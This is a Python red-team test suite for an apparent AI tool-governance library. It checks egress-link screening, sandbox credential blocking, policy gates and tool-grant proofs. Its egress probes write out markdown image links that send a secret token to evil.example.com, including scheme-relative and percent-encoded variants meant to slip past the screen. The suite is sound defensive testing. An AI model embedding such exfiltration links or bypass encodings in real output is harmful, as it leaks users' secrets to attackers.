"""Wave-274 independent red-team battery (break-first audit of the wave-273 merge).

Attacks the NEW wave-273 code and closure seams at the public API:
egress_refs screening (trusted-relay / data rules), image_text
filler-omission candidates (F282), gate_hardening deepcopy + monitor
accounting, bundle_delivery delegations + expired bootstrap,
evidence_fanout backpressure, tool_grant v2 closures (deny-cache
proof+context binding F278, exchange holder-seed ceremony F285), and
the sandbox real-credential boundary screen.

New defects found by this battery (filed 2026-10-01, OPEN at file time):
  F288  egress_refs (MEDIUM): scheme-relative URLs (//host/...) are
        classified "not-external" and allowed -- screening bypass
        (probe eg01).
  F289  egress_refs (MEDIUM): percent-encoded sensitive tokens defeat
        the digest leg on direct refs; the relay leg decodes but the
        direct leg does not (probe eg02).
  F290  image_text (MEDIUM): F282 filler-omission candidate enumeration
        is O(n^2) in channel count with no chunk cap -- screening-path
        DoS (probe im01).
  F291  gate_hardening (LOW): F258 deepcopy sits outside the try --
        evaluate()/scan() raise raw TypeError/RecursionError, violating
        the documented "Never raises" contract (probes gh01/gh02).

Conventions: module-level staging default; verify standalone under
`env -u GOV_DEPLOYMENT_MODE`; deterministic (fixed seeds, explicit
`now`); fresh unique /var/tmp/g274* TMPDIR (`mkdir -p` first);
depth-1 green checks honoring GOV_SKIP_GREEN=1; no in-repo git
subprocesses; stdlib only.
"""

import base64
import hashlib
import json
import os
import re
import struct
import sys
import tempfile
import threading
import urllib.parse
from datetime import datetime, timezone

os.environ.setdefault("GOV_DEPLOYMENT_MODE", "staging")
# Deterministic audit-log key (fixed, not secrets.token_hex).
os.environ.setdefault(
    "GOV_LOG_KEY",
    "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")
os.environ.setdefault("GOV_LOG_KEY_EPOCH", "w274-redteam")

_TMP = tempfile.mkdtemp(prefix="g274-redteam-%d-" % os.getpid(),
                        dir="/var/tmp")
os.makedirs(_TMP, exist_ok=True)
os.environ["TMPDIR"] = _TMP

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)

import gov.egress_refs as egress_refs            # noqa: E402
import gov.image_text as it                       # noqa: E402
import gov.gate_hardening as gh                   # noqa: E402
import gov.bundle_delivery as bd                  # noqa: E402
import gov.evidence_fanout as fanout              # noqa: E402
import gov.tool_grant as tool_grant               # noqa: E402
import gov.sandbox as sb                          # noqa: E402
import gov.sentinel_substitution as sent          # noqa: E402
import gov.ed25519 as _ed                         # noqa: E402
from gov.signing import Ed25519Signer             # noqa: E402

TAXONOMY_PIN = 1485  # Wave-274 merge: pin 1458 -> 1477 (+3 provlabel-* + 8 rail-* + 3 decodetrust-* + 5 attestor-*).
GREEN_SKIP = os.environ.get("GOV_SKIP_GREEN") == "1"

_RESULTS = []


def _seed(i):
    return bytes([i & 0xFF]) * 32


def _run(pid, expected, fn):
    try:
        verdict, note = fn()
    except Exception as exc:  # noqa: BLE001
        verdict, note = "ERROR", "%s: %s" % (type(exc).__name__, exc)
    ok = (verdict == expected)
    _RESULTS.append((pid, expected, verdict, ok, note))


def _pin_check():
    with open(os.path.join(REPO, "gov", "decision_codes.py"),
              encoding="utf-8") as fh:
        src = fh.read()
    literals = re.findall(r'"code": \'([^\']*)\'', src)
    if len(literals) != TAXONOMY_PIN:
        return ("BREAK", "taxonomy pin drift: %d literals, pin %d"
                % (len(literals), TAXONOMY_PIN))
    if len(set(literals)) != len(literals):
        return "BREAK", "duplicate code literals in taxonomy"
    return "HELD", "taxonomy pin 1485: 1485 unique literals"


# ---------------------------------------------------------------------------
# egress_refs: F288 (scheme-relative bypass), F289 (pct-encoded digest evasion)
# ---------------------------------------------------------------------------

_EG_SECRET = "sk-live-9f8e7d6c5b4a39482716"
_EG_POLICY = None


def _eg_policy():
    global _EG_POLICY
    if _EG_POLICY is None:
        _EG_POLICY = egress_refs.EgressPolicy(
            trusted_relays=[("relay.example.com", "/urlp")],
            allowed_hosts=["cdn.example.com"],
            sensitive_digests=[
                hashlib.sha256(_EG_SECRET.encode("utf-8")).hexdigest()],
        )
    return _EG_POLICY


def eg01_scheme_relative_bypass():
    """F288: a scheme-relative URL carrying a sensitive token is
    extracted (image-inline) but screened as 'not-external' -> allow.
    The absolute-URL control is refused. Expected HELD (closed
    2026-10-01, wave-275 lane A: scheme-relative treated as
    https-external)."""
    content = ("![x](//evil.example.com/collect?token=%s)" % _EG_SECRET)
    r = egress_refs.screen_egress_refs(content, policy=_eg_policy())
    if r["verdict"] == "allow" and r["code"] is None:
        kinds = [ref["kind"] for ref in r["refs"]]
        if "image-inline" in kinds:
            return ("BREAK",
                    "F288: scheme-relative exfil ref extracted but "
                    "allowed as not-external")
        return "ERROR", "ref not extracted: %r" % (kinds,)
    return "HELD", "scheme-relative ref refused: %s" % (r["code"],)


def eg02_pct_encoded_digest_evasion():
    """F289: percent-encoding the sensitive token defeats the digest
    leg on a DIRECT ref (the relay leg decodes; the direct leg does
    not). Expected HELD (closed 2026-10-01, wave-275 lane A: query
    form-decoded / fragment decoded, bounded-iterative, before digest
    tokenization)."""
    enc = "".join("%%%02X" % b for b in _EG_SECRET.encode("utf-8"))
    content = ("![x](https://evil.example.com/collect?token=%s)" % enc)
    r = egress_refs.screen_egress_refs(content, policy=_eg_policy())
    if r["verdict"] == "allow" and r["code"] is None:
        return ("BREAK",
                "F289: percent-encoded sensitive token evades the "
                "digest leg on a direct ref")
    return "HELD", "encoded token refused: %s" % (r["code"],)


def eg03_relay_leg_decodes_inner():
    """The relay leg DOES decode the inner target before digest/size
    evaluation (wave-273 e08 fix): relay-wrapped sensitive token ->
    egress-relay-exfil. Expected HELD."""
    inner = "https://evil.example.com/collect?token=" + _EG_SECRET
    content = ("![x](https://relay.example.com/urlp?url=%s)"
               % urllib.parse.quote(inner, safe=""))
    r = egress_refs.screen_egress_refs(content, policy=_eg_policy())
    if r["verdict"] == "refuse" and r["code"] == "egress-relay-exfil":
        return "HELD", "relay inner decoded and refused"
    return "BREAK", "relay leg missed: %s %s" % (r["verdict"], r["code"])


def eg04_absolute_direct_token_refused():
    """Absolute direct ref with a plaintext sensitive token ->
    egress-ref-data-exfil. Expected HELD."""
    content = ("![x](https://evil.example.com/collect?token=%s)"
               % _EG_SECRET)
    r = egress_refs.screen_egress_refs(content, policy=_eg_policy())
    if r["verdict"] == "refuse" and r["code"] == "egress-ref-data-exfil":
        return "HELD", "absolute direct token refused"
    return "BREAK", "missed: %s %s" % (r["verdict"], r["code"])


def eg05_relative_ref_stays_allowed():
    """Genuinely relative refs (path, fragment) are not egress and
    stay allowed -- anti-FP pin for any F288 fix. Expected HELD."""
    r = egress_refs.screen_egress_refs(
        "[x](/local/path) and [y](#frag) and ![z](img.png)",
        policy=_eg_policy())
    if r["verdict"] == "allow":
        return "HELD", "relative refs allowed"
    return "BREAK", "FP: relative ref refused: %s" % (r["code"],)


# ---------------------------------------------------------------------------
# image_text: F290 (quadratic candidate enumeration, no chunk cap)
# ---------------------------------------------------------------------------

def im01_quadratic_candidates():
    """F290 (wave-275 CLOSED): _screening_candidates used to enumerate
    1+n+n(n-1)/2 candidates with an O(n)-char join EACH (join before
    the dedup check), and nothing capped the channel count -- n=150
    yielded 11326. The wave-275 fix bounds enumeration to a lazy
    hybrid-window generator: n=150 now yields 2415 (1 full + 150
    singles + 2264 gated pairs), each probe window-bounded. Expected
    HELD (closed). A return to the quadratic count is BREAK."""
    n = 150
    texts = ["filler-text-%04d" % i for i in range(n)]
    cands = list(it._screening_candidates(texts))  # noqa: SLF001
    quadratic = 1 + n + n * (n - 1) // 2
    if len(cands) == quadratic:
        return ("BREAK",
                "F290 regression: %d channels enumerate %d candidates "
                "(unbounded quadratic)" % (n, quadratic))
    if len(cands) == 2415:
        return ("HELD", "enumeration bounded: 2415 of %d (F290 closed)"
                % (quadratic,))
    return "ERROR", "unexpected count %d" % (len(cands),)


# ---------------------------------------------------------------------------
# gate_hardening: F291 (deepcopy raise), monitor accounting
# ---------------------------------------------------------------------------

def _gh_gate(mode="protect"):
    spec = {"policy_id": "p1", "predicate_name": "t",
            "predicate": lambda req: True, "host_callbacks": []}
    g = gh.Gate(mode=mode, global_deadline_s=30)
    g.register_policy(gh.compile_policy(spec))
    return g


def gh01_deepcopy_raises():
    """F291: evaluate() documents 'Never raises' -- the F258 deepcopy
    used to sit outside the try and raised raw TypeError. CLOSED
    2026-10-01 (wave-275 lane C): the deepcopy is inside the
    fail-closed boundary and becomes a coded gatehard-gate-error deny.
    Expected HELD."""
    g = _gh_gate()
    try:
        g.evaluate({"request_id": "r1", "lock": threading.Lock()})
    except TypeError:
        return ("BREAK",
                "F291: evaluate() raises raw TypeError on an "
                "un-deepcopyable request")
    except Exception as exc:  # noqa: BLE001
        return ("BREAK",
                "F291: evaluate() raises %s (not a fail-closed verdict)"
                % type(exc).__name__)
    return "HELD", "evaluate() returned a verdict"


def gh02_scan_deepcopy_raises():
    """F291, scan() leg: the deepcopy used to sit outside the
    per-request try. CLOSED 2026-10-01 (wave-275 lane C): hostile
    copies now yield a coded gatehard-gate-error deny row.
    Expected HELD."""
    g = _gh_gate()
    try:
        g.scan([{"request_id": "r1", "lock": threading.Lock()}])
    except TypeError:
        return ("BREAK",
                "F291: scan() raises raw TypeError on an "
                "un-deepcopyable request")
    except Exception as exc:  # noqa: BLE001
        return ("BREAK", "F291: scan() raises %s" % type(exc).__name__)
    return "HELD", "scan() returned rows"


def gh03_evaluate_allow_deny_sanity():
    """Baseline: a True predicate allows, a False predicate denies
    with a coded verdict. Expected HELD."""
    g = _gh_gate()
    v = g.evaluate({"request_id": "a"})
    if not (v["allowed"] is True and v["mode"] == "protect"):
        return "BREAK", "allow broken: %r" % (v,)
    spec = {"policy_id": "p1", "predicate_name": "f",
            "predicate": lambda req: False, "host_callbacks": []}
    g2 = gh.Gate(mode="protect", global_deadline_s=30)
    g2.register_policy(gh.compile_policy(spec))
    v2 = g2.evaluate({"request_id": "d"})
    if v2["allowed"] is False and v2["code"] == "gatehard-policy-denied":
        return "HELD", "allow/deny baseline sane"
    return "BREAK", "deny broken: %r" % (v2,)


def gh04_monitor_never_denies():
    """Monitor mode never denies: a would-deny is allowed with the
    monitor code and counted. Expected HELD."""
    spec = {"policy_id": "p1", "predicate_name": "f",
            "predicate": lambda req: False, "host_callbacks": []}
    g = gh.Gate(mode="monitor", global_deadline_s=30)
    g.register_policy(gh.compile_policy(spec))
    v = g.evaluate({"request_id": "m"})
    rep = g.monitor_report()
    if (v["allowed"] is True
            and v["code"] == "gatehard-monitor-would-deny"
            and rep["monitor_would_deny"].get("gatehard-policy-denied")
            == 1):
        return "HELD", "monitor would-deny counted, not enforced"
    return "BREAK", "monitor divergence: %r %r" % (v, rep)


# ---------------------------------------------------------------------------
# sandbox: real-credential boundary screen (wave-273 lane H)
# ---------------------------------------------------------------------------

_SB_REAL = "sb-real-credential-4f2a9c"
_SB_BENIGN = "a3f9c2e1b4d60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5"


def _sb_vault():
    v = sent.SentinelVault()
    v.register("cred-1", _SB_REAL, ["api.example.com"],
               credential_class="api-key", release_policy="legacy-host-only")
    return v


def sb01_oracle_contract():
    """The membership oracle: real matches (str and bytes); sentinel
    placeholder, benign, decoy, None, int never match. Expected HELD."""
    v = _sb_vault()
    sentinel = v.sentinel_for("cred-1")
    decoy = v.register_decoy("trip")
    checks = [
        v.is_registered_real(_SB_REAL) is True,
        v.is_registered_real(_SB_REAL.encode("utf-8")) is True,
        v.is_registered_real(sentinel) is False,
        v.is_registered_real(_SB_BENIGN) is False,
        v.is_registered_real(decoy) is False,
        v.is_registered_real(None) is False,
        v.is_registered_real(12345) is False,
    ]
    if all(checks):
        return "HELD", "oracle: exact-equality only"
    return "BREAK", "oracle mismatch: %r" % (checks,)


def sb02_boundary_refuses_real_env():
    """A whole-value real credential in the child env refuses LOUDLY
    before spawn (SandboxError naming sandbox-real-credential-blocked).
    The screen runs before jail creation, so no child ever exists.
    Expected HELD."""
    box = sb.Sandbox(sentinel_vault=_sb_vault())
    try:
        box.run(["/bin/true"], extra_env={"API_KEY": _SB_REAL})
    except sb.SandboxError as exc:
        if "sandbox-real-credential-blocked" in str(exc):
            return "HELD", "boundary refused loudly before spawn"
        return "BREAK", "wrong refusal: %s" % (exc,)
    return "BREAK", "real credential crossed the boundary silently"


def sb03_vault_shaped_non_oracle_rejected():
    """A vault-shaped object that cannot answer the membership
    question is rejected at construction (fail-closed), never treated
    as 'no vault'. Expected HELD."""
    try:
        sb.Sandbox(sentinel_vault=object())
    except ValueError:
        return "HELD", "non-oracle vault rejected"
    return "BREAK", "vault-shaped non-oracle accepted silently"


# ---------------------------------------------------------------------------
# bundle_delivery: delegations (shadow lint, cycles) + expired bootstrap
# ---------------------------------------------------------------------------

_BD_NOW = datetime(2026, 10, 1, tzinfo=timezone.utc)
_BD_FUTURE = "2030-01-01T00:00:00Z"
_BD_PAST = "2020-01-01T00:00:00Z"


def _bd_keypair(i):
    signer = Ed25519Signer(_seed(i))
    kid = "key-%d" % i
    keys = {kid: {"keytype": "ed25519",
                  "keyval": {"public": signer.public_key.hex()}}}
    return signer, kid, keys


def _bd_top_doc(roles, keys):
    return {
        "targets": {},
        "delegations": {
            "keys": keys,
            "roles": roles,
        },
    }


def _bd_role(name, kid, paths=None, terminating=False):
    entry = {"name": name, "keyids": [kid], "threshold": 1,
             "terminating": terminating}
    if paths is not None:
        entry["paths"] = paths
    return entry


def _bd_sealed_delegated(version, expires, delegations, signer, kid):
    doc = {"_type": "delegated-targets", "version": version,
           "expires": expires, "targets": {},
           "delegations": delegations}
    return bd.seal_delegated_targets(doc, [(kid, signer)]), doc


def bd01_terminating_shadow_refused():
    """A terminating delegation that provably shadows a later one is
    refused fail-closed (never silently served). Expected HELD."""
    _signer, kid, keys = _bd_keypair(11)
    doc = _bd_top_doc(
        [_bd_role("a", kid, paths=["skills/*"], terminating=True),
         _bd_role("b", kid, paths=["skills/x"])],
        keys)

    def _no_fetch(_name):
        raise AssertionError("fetch must not run past a proven shadow")

    try:
        bd.resolve_target("other/target", doc, _no_fetch, _BD_NOW)
    except bd.DeliveryError as exc:
        if exc.code == "bundle-delivery-shadowed-delegation":
            return "HELD", "proven shadow refused loudly"
        return "BREAK", "wrong code: %s" % (exc.code,)
    return "BREAK", "shadowed delegation served silently"


def bd02_delegation_cycle_refused():
    """A delegation cycle on the DFS path (a -> b -> a) fails closed.
    Expected HELD."""
    signer, kid, keys = _bd_keypair(12)

    def delegations(*names):
        return {"keys": keys,
                "roles": [_bd_role(n, kid, paths=["t/*"]) for n in names]}

    top = _bd_top_doc([_bd_role("a", kid, paths=["t/*"])], keys)
    wire_a, _doc_a = _bd_sealed_delegated(1, _BD_FUTURE,
                                         delegations("b"), signer, kid)
    wire_b, _doc_b = _bd_sealed_delegated(1, _BD_FUTURE,
                                         delegations("a"), signer, kid)
    wires = {"a": wire_a, "b": wire_b}

    def _fetch(name):
        return wires[name]

    try:
        bd.resolve_target("t/x", top, _fetch, _BD_NOW)
    except bd.DeliveryError as exc:
        if exc.code == "bundle-delivery-delegation-cycle":
            return "HELD", "cycle refused loudly"
        return "BREAK", "wrong code: %s" % (exc.code,)
    return "BREAK", "cyclic delegation resolved silently"


def _bd_toy_verifier(store):
    def _verify(role_name, role_info, keys, wire, where):
        env = json.loads(bytes(wire).decode("utf-8"))
        payload = base64.b64decode(env["payload"])
        doc = json.loads(payload.decode("utf-8"))
        if doc.get("_type") != "delegated-targets":
            raise bd.DeliveryError(
                "bundle-delivery-delegation-malformed",
                "%s: not a delegated-targets doc" % where)
        return doc
    return _verify


def bd03_expired_bootstrap_single_hop():
    """An expired v1 intermediate bootstraps its non-expired v2
    successor (exact N -> N+1). Expected HELD."""
    signer, kid, keys = _bd_keypair(13)
    boot = bd.ExpiredBootstrap(_bd_toy_verifier({}))
    expired_doc = {"version": 1, "expires": _BD_PAST}
    _wire_v2, doc_v2 = _bd_sealed_delegated(1, _BD_FUTURE,
                                            {"keys": {}, "roles": []},
                                            signer, kid)
    # Re-seal as version 2 for the successor leg.
    wire_v2, doc_v2 = _bd_sealed_delegated(2, _BD_FUTURE,
                                          {"keys": {}, "roles": []},
                                          signer, kid)
    got = boot.adopt("role", (expired_doc, None, keys),
                     [(wire_v2, doc_v2)], _BD_NOW)
    if got.get("version") == 2:
        return "HELD", "single-hop bootstrap adopts v2"
    return "BREAK", "bootstrap returned %r" % (got,)


def bd04_expired_bootstrap_rollback_refused():
    """A replayed v1 presented as the successor of expired v1 is a
    rollback and is refused. Expected HELD."""
    signer, kid, keys = _bd_keypair(14)
    boot = bd.ExpiredBootstrap(_bd_toy_verifier({}))
    expired_doc = {"version": 1, "expires": _BD_PAST}
    wire_v1, doc_v1 = _bd_sealed_delegated(1, _BD_FUTURE,
                                          {"keys": {}, "roles": []},
                                          signer, kid)
    try:
        boot.adopt("role", (expired_doc, None, keys),
                   [(wire_v1, doc_v1)], _BD_NOW)
    except bd.DeliveryError as exc:
        if exc.code == "bundle-delivery-expired-bootstrap-refused":
            return "HELD", "rollback refused"
        return "BREAK", "wrong code: %s" % (exc.code,)
    return "BREAK", "rollback adopted silently"


# ---------------------------------------------------------------------------
# evidence_fanout: backpressure accounting
# ---------------------------------------------------------------------------

def fo01_counted_drop_counts():
    """counted-drop: a full queue refuses the item and counts it
    (dropped + dropped_by_reason); oldest items are never evicted.
    Expected HELD."""
    q = fanout.FanoutQueue(maxsize=2, policy="counted-drop")
    q.submit("a", reason="enqueue")
    q.submit("b", reason="enqueue")
    verdict = q.submit("c", reason="enqueue")
    st = q.stats()
    if (verdict == "dropped" and st["dropped"] == 1
            and st["dropped_by_reason"].get("enqueue") == 1
            and st["accepted"] == 2 and q.qsize() == 2
            and q.get(block=False) == "a"):
        return "HELD", "drop-tail counted, order kept"
    return "BREAK", "accounting wrong: %r" % (st,)


def fo02_fail_closed_raises():
    """fail-closed: a full queue raises FanoutFullError; the item is
    NOT accepted. Expected HELD."""
    q = fanout.FanoutQueue(maxsize=1, policy="fail-closed")
    q.submit("a")
    try:
        q.submit("b")
    except fanout.FanoutFullError:
        if q.qsize() == 1:
            return "HELD", "fail-closed raises, nothing accepted"
        return "BREAK", "queue grew past maxsize"
    return "BREAK", "full queue accepted silently"


def fo03_priority_bypass_reliable():
    """submit_priority bypasses the bound (operator healing channel):
    a full queue still accepts the priority item. Expected HELD."""
    q = fanout.FanoutQueue(maxsize=1, policy="counted-drop")
    q.submit("a")
    verdict = q.submit_priority("heal", reason="recover")
    if verdict == "accepted" and q.qsize() == 2:
        return "HELD", "priority channel bypasses the bound"
    return "BREAK", "priority submit refused: %r" % (verdict,)


# ---------------------------------------------------------------------------
# tool_grant v2: F278 deny-cache proof+context binding, F285 ceremony
# ---------------------------------------------------------------------------

_TG_NOW = 1791000000
_TG_SERVER_NAME = "srv"
_TG_SERVER_URI = "https://mcp.example/"
_TG_MANDATE_ID = "mandate-1"
_TG_LINK_A = "sha256:" + "aa" * 32
_TG_ISS_SEED = b"\x11" * 32
_TG_HOLDER_SEED = b"\x22" * 32
_TG_HOLDER2_SEED = b"\x33" * 32


def _tg_fixture():
    mandates = {_TG_MANDATE_ID: {"version": 1}}
    issuer = tool_grant.Issuer("sasanam-tool-as", _TG_ISS_SEED,
                               lambda mid: mandates.get(mid))
    holder_pub = _ed.publickey(_TG_HOLDER_SEED)
    details = [
        {"type": tool_grant.GRANT_TYPE, "identifier": "srv::tool_a",
         "locations": [_TG_SERVER_URI], "actions": ["call"],
         "arg_bounds": {"path": {"predicate": "prefix",
                                 "params": {"prefix": "/safe/"}}},
         "supply_chain": {"link_digest": _TG_LINK_A}, "max_calls": 5},
    ]
    grant = issuer.issue(
        sub="spiffe://example/workload-1", aud=_TG_SERVER_URI,
        proof_pub=holder_pub, mandate_id=_TG_MANDATE_ID,
        mandate_version=1, details=details, lifetime_s=600,
        now=_TG_NOW)
    links = {"tool_a": _TG_LINK_A}

    def base_kw(store):
        return dict(
            issuer_pub=issuer.issuer_pub, server_name=_TG_SERVER_NAME,
            server_uri=_TG_SERVER_URI, now=_TG_NOW, usage_store=store,
            mandate_version_provider=lambda mid: mandates[mid]["version"],
            link_verifier=lambda tool: links[tool])

    def proof(seed, nonce):
        return tool_grant.make_pop_proof(seed, grant,
                                         method="tools/call",
                                         uri=_TG_SERVER_URI,
                                         now=_TG_NOW, nonce=nonce)

    return {"grant": grant, "proof": proof, "base_kw": base_kw,
            "cred": {"scopes": ["data-plane"]}, "issuer": issuer,
            "details": details}


def _tg_call(f, store, cache, *, seed, nonce, args, context):
    return tool_grant.evaluate_request(
        f["grant"], proof=f["proof"](seed, nonce), tool="tool_a",
        args=args, request_context=context, caller_cred=f["cred"],
        verdict_cache=cache, **f["base_kw"](store))


def tg01_deny_cache_binds_proof():
    """F278: a deny cached for one proof is never served to a
    different proof. Replay a proof (deny ptgrant-jti-reused, cached),
    then present a FRESH proof: it must be evaluated on its own merits
    (no cache:deny-hit), not served the stale deny. Expected HELD."""
    f = _tg_fixture()
    store = tool_grant.UsageStore()
    cache = {}
    args = {"path": "/safe/x"}
    v1 = _tg_call(f, store, cache, seed=_TG_HOLDER_SEED, nonce="tg01-a",
                  args=args, context=None)
    if not v1["ok"]:
        return "ERROR", "first call denied: %r" % (v1.get("code"),)
    v2 = _tg_call(f, store, cache, seed=_TG_HOLDER_SEED, nonce="tg01-a",
                  args=args, context=None)
    if not (v2["ok"] is False
            and v2.get("code") == "ptgrant-jti-reused"):
        return "ERROR", "replay not denied as expected: %r" % (v2,)
    v3 = _tg_call(f, store, cache, seed=_TG_HOLDER_SEED, nonce="tg01-b",
                  args=args, context=None)
    if v3["ok"] is True and "cache:deny-hit" not in v3.get("checked", []):
        return "HELD", "fresh proof evaluated independently"
    if "cache:deny-hit" in v3.get("checked", []):
        return ("BREAK",
                "F278: stale replay-deny served to a fresh proof")
    return "ERROR", "unexpected: %r" % (v3,)


def tg02_deny_cache_binds_context():
    """F278, context leg: identical (grant, proof, args) but different
    request_context must not share a cached deny. Expected HELD."""
    f = _tg_fixture()
    store = tool_grant.UsageStore()
    cache = {}
    args = {"path": "/safe/x"}
    v1 = _tg_call(f, store, cache, seed=_TG_HOLDER_SEED, nonce="tg02-a",
                  args=args, context={"zone": "a"})
    if not v1["ok"]:
        return "ERROR", "first call denied: %r" % (v1.get("code"),)
    # Force a cached deny under context {"zone": "a"} by replaying the
    # proof: the jti-reused deny binds (proof, context-a).
    v2 = _tg_call(f, store, cache, seed=_TG_HOLDER_SEED, nonce="tg02-a",
                  args=args, context={"zone": "a"})
    if v2.get("code") != "ptgrant-jti-reused":
        return "ERROR", "replay not denied: %r" % (v2,)
    # Same proof REPLAY but a different context: the deny key binds the
    # context, so this must be recomputed, not a cache hit.
    v3 = _tg_call(f, store, cache, seed=_TG_HOLDER_SEED, nonce="tg02-a",
                  args=args, context={"zone": "b"})
    if "cache:deny-hit" in v3.get("checked", []):
        return ("BREAK",
                "F278: deny cached for one context served to another")
    return "HELD", "context is bound in the deny key"


def tg03_exchange_holder_seed_ceremony():
    """F285: exchange() requires the 32-byte parent holder seed whose
    derived key matches the parent's cnf.jkt; a wrong seed (or a
    non-32-byte seed) raises ptgrant-pop-invalid. Read-only access to
    the parent cannot mint a child. Expected HELD."""
    f = _tg_fixture()
    issuer = f["issuer"]
    narrowed = [dict(f["details"][0],
                     arg_bounds={"path": {"predicate": "prefix",
                                          "params": {"prefix":
                                                     "/safe/sub/"}}})]
    # Wrong seed, right length: refused.
    try:
        issuer.exchange(
            f["grant"], parent_holder_seed=b"\x99" * 32,
            details=narrowed, now=_TG_NOW,
            proof_pub=_ed.publickey(_TG_HOLDER2_SEED), lifetime_s=60)
    except tool_grant.GrantError as exc:
        if "ptgrant-pop-invalid" not in str(exc):
            return "BREAK", "wrong code: %s" % (exc,)
    else:
        return "BREAK", "exchange with a stranger seed minted a child"
    # Correct holder seed: the ceremony completes.
    try:
        child = issuer.exchange(
            f["grant"], parent_holder_seed=_TG_HOLDER_SEED,
            details=narrowed, now=_TG_NOW,
            proof_pub=_ed.publickey(_TG_HOLDER2_SEED), lifetime_s=60)
    except tool_grant.GrantError as exc:
        return "BREAK", "legitimate exchange refused: %s" % (exc,)
    det0 = child.get("body", {}).get("authorization_details", [{}])[0]
    bounds = det0.get("arg_bounds", {})
    if (bounds.get("path", {}).get("params", {}).get("prefix")
            == "/safe/sub/"):
        return "HELD", "holder-seed ceremony enforced"
    return "BREAK", "child not narrowed as requested"


# ---------------------------------------------------------------------------
# green checks (depth-1) + main
# ---------------------------------------------------------------------------

_GREEN_BATTERIES = [
    "w273_egress_probes.py",
    "w273_fanout_probes.py",
    "w273_tuf_probes.py",
    "w273_sandboxcred_probes.py",
]


def _green_checks():
    if GREEN_SKIP:
        return [("green", "SKIP",
                 "GOV_SKIP_GREEN=1 (depth-1 convention)")]
    notes = []
    evals_dir = os.path.join(REPO, "evals")
    for battery in _GREEN_BATTERIES:
        env = dict(os.environ)
        env["GOV_SKIP_GREEN"] = "1"
        try:
            import subprocess
            proc = subprocess.run(
                [sys.executable, os.path.join(evals_dir, battery)],
                env=env, cwd=REPO, capture_output=True, text=True,
                timeout=600)
            tail = (proc.stdout or "").strip().splitlines()[-3:]
            ok = proc.returncode == 0
            notes.append((
                "green", "HELD" if ok else "BREAK",
                "%s rc=%d: %s" % (battery, proc.returncode,
                                  " | ".join(tail))))
        except Exception as exc:  # noqa: BLE001
            notes.append(("green", "ERROR",
                          "%s: %s" % (battery, exc)))
    return notes


_PROBES = [
    # (id, expected, fn)
    ("pin-taxonomy", "HELD", _pin_check),
    # egress_refs: F288 / F289 (closed 2026-10-01, wave-275 lane A).
    ("eg01-scheme-relative-bypass", "HELD",
     eg01_scheme_relative_bypass),
    ("eg02-pct-encoded-digest-evasion", "HELD",
     eg02_pct_encoded_digest_evasion),
    ("eg03-relay-leg-decodes-inner", "HELD",
     eg03_relay_leg_decodes_inner),
    ("eg04-absolute-direct-token-refused", "HELD",
     eg04_absolute_direct_token_refused),
    ("eg05-relative-ref-stays-allowed", "HELD",
     eg05_relative_ref_stays_allowed),
    # image_text: F290 (closed wave-275).
    ("im01-quadratic-candidates", "HELD",
     im01_quadratic_candidates),
    # gate_hardening: F291 (new breaks) + monitor accounting.
    ("gh01-deepcopy-raises", "HELD",
     gh01_deepcopy_raises),
    ("gh02-scan-deepcopy-raises", "HELD",
     gh02_scan_deepcopy_raises),
    ("gh03-evaluate-allow-deny-sanity", "HELD",
     gh03_evaluate_allow_deny_sanity),
    ("gh04-monitor-never-denies", "HELD",
     gh04_monitor_never_denies),
    # sandbox real-credential boundary screen.
    ("sb01-oracle-contract", "HELD",
     sb01_oracle_contract),
    ("sb02-boundary-refuses-real-env", "HELD",
     sb02_boundary_refuses_real_env),
    ("sb03-vault-shaped-non-oracle-rejected", "HELD",
     sb03_vault_shaped_non_oracle_rejected),
    # bundle_delivery: delegations + expired bootstrap.
    ("bd01-terminating-shadow-refused", "HELD",
     bd01_terminating_shadow_refused),
    ("bd02-delegation-cycle-refused", "HELD",
     bd02_delegation_cycle_refused),
    ("bd03-expired-bootstrap-single-hop", "HELD",
     bd03_expired_bootstrap_single_hop),
    ("bd04-expired-bootstrap-rollback-refused", "HELD",
     bd04_expired_bootstrap_rollback_refused),
    # evidence_fanout: backpressure accounting.
    ("fo01-counted-drop-counts", "HELD",
     fo01_counted_drop_counts),
    ("fo02-fail-closed-raises", "HELD",
     fo02_fail_closed_raises),
    ("fo03-priority-bypass-reliable", "HELD",
     fo03_priority_bypass_reliable),
    # tool_grant v2: F278 deny-cache binding, F285 ceremony.
    ("tg01-deny-cache-binds-proof", "HELD",
     tg01_deny_cache_binds_proof),
    ("tg02-deny-cache-binds-context", "HELD",
     tg02_deny_cache_binds_context),
    ("tg03-exchange-holder-seed-ceremony", "HELD",
     tg03_exchange_holder_seed_ceremony),
]


def main():
    print("w274 red-team battery: %d probes (TMPDIR=%s)" % (len(_PROBES),
                                                            _TMP))
    failures = 0
    for pid, expected, fn in _PROBES:
        _run(pid, expected, fn)
    for pid, expected, verdict, ok, note in _RESULTS:
        flag = "ok " if ok else "FAIL"
        if not ok:
            failures += 1
        print("[%s] %-42s expected=%-5s got=%-5s %s"
              % (flag, pid, expected, verdict, note))
    print("--- green checks (depth-1) ---")
    for name, verdict, note in _green_checks():
        print("[%s] %s %s" % ("ok " if verdict in ("HELD", "SKIP") else "FAIL",
                              name, note))
        if verdict not in ("HELD", "SKIP"):
            failures += 1
    n_break = sum(1 for r in _RESULTS if r[2] == "BREAK")
    n_held = sum(1 for r in _RESULTS if r[2] == "HELD")
    n_err = sum(1 for r in _RESULTS if r[2] == "ERROR")
    print("probes: %d BREAK / %d HELD / %d ERROR; mismatches: %d"
          % (n_break, n_held, n_err, failures))
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
